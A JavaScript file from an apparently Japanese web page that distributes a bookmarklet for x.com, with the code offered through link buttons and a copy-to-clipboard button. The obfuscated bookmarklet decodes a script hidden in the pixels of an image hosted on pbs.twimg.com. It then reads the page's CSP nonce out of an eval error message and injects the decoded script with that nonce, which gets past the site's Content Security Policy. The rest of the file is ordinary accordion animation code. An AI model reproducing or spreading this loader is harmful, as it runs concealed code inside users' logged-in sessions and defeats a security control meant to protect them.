let code = "javascript:if(%22x.com%22!%3Dwindow.location.host)alert(%22Twitter(X)%5Cu3092%5Cu958b%5Cu3044%5Cu305f%5Cu72b6%5Cu614b%5Cu3067%5Cu5b9f%5Cu884c%5Cu3057%5Cu3066%5Cu304f%5Cu3060%5Cu3055%5Cu3044%22)%3Belse%7Bvar%20start%3Ddocument.createElement(%22div%22)%3Bstart.innerText%3D%22%5Cu8d77%5Cu52d5%5Cu4e2d%22%3Bstart.style.cssText%3D%22z-index%3A99999%3Bwidth%3A30%25%3Bheight%3A80px%3Bline-height%3A80px%3Bfont-weight%3Abold%3Bfont-family%3Asans-serif%3Bposition%3Afixed%3Bbackground-color%3A%23fbf7f7%3Bcolor%3A%23000%3Binset%3A0%3Bmargin%3Aauto%3Btext-align%3Acenter%3B%22%3Bdocument.body.appendChild(start)%3Bvar%20xhr%3Dnew%20XMLHttpRequest%3Bxhr.open(%22get%22%2C%22https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FGNwsHrmbgAEuylL.png%22)%3Bxhr.responseType%3D%22blob%22%3Bxhr.send()%3Bxhr.onreadystatechange%3Dfunction()%7Bif(4%3D%3D%3Dxhr.readyState%26%26200%3D%3D%3Dxhr.status)%7Bvar%20f%3Ddocument.createElement(%22canvas%22)%2Cc%3Dnew%20Image%3Bc.src%3DURL.createObjectURL(this.response)%3Bc.onload%3Dfunction()%7Bvar%20b%3Df.getContext(%222d%22%2C%7BwillReadFrequently%3A!0%7D)%2Cd%3Dc.width%2Cg%3Dc.height%2Ca%3D%5B%5D%2Cl%3D!1%2Cm%3D%22%22%3Bf.setAttribute(%22width%22%2Cd)%3Bf.setAttribute(%22height%22%2Cg)%3Bb.drawImage(c%2C0%2C0%2Cd%2Cg)%3Bvar%20e%3D0%3Ba%3Afor(%3Be%3Cd*g%3Be%2B%2B)for(var%20n%3Db.getImageData(Math.floor(e%2Fd)%2Ce%25d%2C1%2C1)%2Ch%3D0%3B3%3Eh%3Bh%2B%2B)%7Bvar%20k%3Dn.data%5Bh%5D%3Bif(l%26%26255%3D%3Dk)break%20a%3Ba.push(k)%3Bl%3D255%3D%3Dk%7Dfor(b%3D0%3Bb%3C(a.length-1)%2F2%3Bb%2B%2B)m%2B%3DString.fromCharCode(256*a%5B2*b%5D%2Ba%5B2*b%2B1%5D)%3Btry%7Beval(%22%22)%7Dcatch(p)%7Bfor(a%3Dp.message.split(%22'%22)%2Cb%3D0%3Bb%3Ca.length%3Bb%2B%2B)a%5Bb%5D.includes(%22nonce%22)%26%26(nonce%3Da%5Bb%5D.slice(6))%7Da%3Ddocument.createElement(%22script%22)%3Ba.src%3D%22data%3Atext%2Fjavascript%3Bbase64%2C%22%2Bbtoa(unescape(encodeURIComponent(m)))%3Ba.onload%3Dfunction()%7Bstart.remove()%3Binit()%7D%3Ba.nonce%3Dnonce%3Bdocument.body.appendChild(a)%7D%7D%7D%7D%3Bvoid+0";
    
document.addEventListener("DOMContentLoaded", () => {
    setUpAccordion();
    document.getElementsByClassName("let")[0].setAttribute('href', code);
    document.getElementsByClassName("let")[2].setAttribute('href', code);
    const button = document.getElementsByClassName("let")[1];
    button.addEventListener('click', () => {
        if (!navigator.clipboard) {
            alert("このブラウザは対応していません");
            return;
        }
        navigator.clipboard.writeText(code).then(
            () => {
                alert('コードをコピーしました。');
            },
            () => {
                alert('コピーに失敗しました。');
            });
    });
});

const setUpAccordion = () => {
    const details = document.querySelectorAll(".js-details");
    const IS_OPENED_CLASS = "is-opened";

    details.forEach((element) => {
        const summary = element.querySelector(".js-summary");
        const content = element.querySelector(".js-content");

        summary.addEventListener("click", (event) => {
            event.preventDefault();
            if (element.classList.contains(IS_OPENED_CLASS)) {
                element.classList.toggle(IS_OPENED_CLASS);
                closingAnim(content, element).restart();
            } else {
                element.classList.toggle(IS_OPENED_CLASS);
                element.setAttribute("open", "true");
                openingAnim(content).restart();
            }
        });
    });
}

const closingAnim = (content, element) => gsap.to(content, {
    height: 0,
    opacity: 0,
    duration: 0.4,
    ease: "power3.out",
    overwrite: true,
    onComplete: () => {
        element.removeAttribute("open");
    },
});

const openingAnim = (content) => gsap.fromTo(
    content, {
        height: 0,
        opacity: 0,
    }, {
        height: "auto",
        opacity: 1,
        duration: 0.4,
        ease: "power3.out",
        overwrite: true,
    });
